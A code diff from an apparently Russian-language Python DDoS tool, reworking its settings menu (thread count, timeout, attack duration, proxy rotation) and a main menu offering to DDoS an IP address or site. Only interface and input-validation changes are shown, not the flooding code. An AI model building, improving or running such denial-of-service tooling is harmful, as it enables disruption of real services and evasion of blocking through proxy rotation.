-    print(f"║ [1] Max Threads : {WHITE}{CONFIG['max_threads']}{PINK}{' ' * (15 - len(str(CONFIG['max_threads'])))}║")
-    print(f"║ [2] Timeout     : {WHITE}{CONFIG['timeout']}s{PINK}{' ' * (15 - len(str(CONFIG['timeout'])))}║")
-    print(f"║ [3] Max Duration: {WHITE}{CONFIG['max_duration']}s{PINK}{' ' * (15 - len(str(CONFIG['max_duration'])))}║")
-    print(f"║ [4] Proxy Rot.  : {WHITE}{CONFIG['proxy_rotation_interval']}{PINK}{' ' * (15 - len(str(CONFIG['proxy_rotation_interval'])))}║")
-    print(f"║ [99] Back                                                      ║")
-    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
+    print(f"{PINK}SETTINGS")
+    print(f"{PINK}[1] Max Threads : {WHITE}{CONFIG['max_threads']}")
+    print(f"{PINK}[2] Timeout     : {WHITE}{CONFIG['timeout']}s")
+    print(f"{PINK}[3] Max Duration: {WHITE}{CONFIG['max_duration']}s")
+    print(f"{PINK}[4] Proxy Rot.  : {WHITE}{CONFIG['proxy_rotation_interval']}")
+    print(f"{PINK}[99] Back{RESET}")
 
     choice = input(f"{PINK}Select: {WHITE}")
     if choice == '1':
-        val = input(f"{PINK}Max Threads (100-2000): {WHITE}")
-        if val.isdigit():
-            CONFIG['max_threads'] = max(100, min(2000, int(val)))
+        val = safe_input_int(f"{PINK}Max Threads (100-2000): {WHITE}", default=1000, min_val=100, max_val=2000)
+        CONFIG['max_threads'] = val
     elif choice == '2':
-        val = input(f"{PINK}Timeout (0.5-10): {WHITE}")
-        try:
-            CONFIG['timeout'] = max(0.5, min(10.0, float(val)))
-        except:
-            pass
+        while True:
+            val = input(f"{PINK}Timeout (0.5-10): {WHITE}")
+            try:
+                val = float(val)
+                if 0.5 <= val <= 10:
+                    CONFIG['timeout'] = val
+                    break
+                else:
+                    logger.warning("[!] Введите число от 0.5 до 10")
+            except:
+                logger.warning("[!] Ошибка: введите число")
     elif choice == '3':
-        val = input(f"{PINK}Max Duration seconds (0 = no limit): {WHITE}")
-        if val.isdigit():
-            CONFIG['max_duration'] = int(val)
+        val = safe_input_int(f"{PINK}Max Duration seconds (0 = no limit): {WHITE}", default=0, min_val=0, max_val=99999)
+        CONFIG['max_duration'] = val
     elif choice == '4':
-        val = input(f"{PINK}Proxy rotation every N requests (5-100): {WHITE}")
-        if val.isdigit():
-            CONFIG['proxy_rotation_interval'] = max(5, min(100, int(val)))
+        val = safe_input_int(f"{PINK}Proxy rotation every N requests (5-100): {WHITE}", default=10, min_val=5, max_val=100)
+        CONFIG['proxy_rotation_interval'] = val
     elif choice == '99':
         return
     settings_menu()
@@ -749,25 +638,23 @@ def main():
     while True:
         os.system("cls" if os.name == "nt" else "clear")
         banner()
-        print(f"""{PINK}
-╔══════════════════════════════════════════════════════════════════╗
-║                          ГЛАВНОЕ МЕНЮ                          ║
-╠══════════════════════════════════════════════════════════════════╣
-║  {WHITE}1. {PINK}DDos Ip Address                                    ║
-║  {WHITE}2. {PINK}View Url Ip Address                                 ║
-║  {WHITE}3. {PINK}DDos site logs                                     ║
-║  {WHITE}4. {PINK}Proxy Management                                   ║
-║  {WHITE}5. {PINK}Total Statistics                                   ║
-║  {WHITE}6. {PINK}History                                            ║
-║  {WHITE}7. {PINK}Settings                                           ║
-║  {WHITE}8. {PINK}INFO — инструкция по использованию                ║
-║  {WHITE}99. {PINK}Exit                                              ║
-╚══════════════════════════════════════════════════════════════════╝
+        print(f"""
+{PINK}ГЛАВНОЕ МЕНЮ
+
+{WHITE}1.{PINK} DDos Ip Address
+{WHITE}2.{PINK} View Url Ip Address
+{WHITE}3.{PINK} DDos site logs
+{WHITE}4.{PINK} Proxy Management
+{WHITE}5.{PINK} Total Statistics
+{WHITE}6.{PINK} History
+{WHITE}7.{PINK} Settings
+{WHITE}8.{PINK} INFO — инструкция по использованию
+{WHITE}99.{PINK} Exit
 {RESET}""")
         try:
             op = int(input(f"{PINK}Выбери опцию (0-99): {WHITE}"))
         except:
-            print(f"{PINK}Invalid input. Reloading Tools!{RESET}")
+            logger.warning("[!] Неверный ввод")
             time.sleep(1.6)
             continue
 
@@ -790,9 +677,10 @@ def main():
         elif op == 99:
             os.system("cls" if os.name == "nt" else "clear")
             print(f"{PINK}Exiting...{RESET}")
+            logger.info("Завершение работы")
             sys.exit()
         else:
-            print(f"{PINK}Invalid input. Reloading Tools!{RESET}")
+            logger.warning("[!] Неверный выбор")
             time.sleep(1.6)
 
 if __name__ == "__main__":
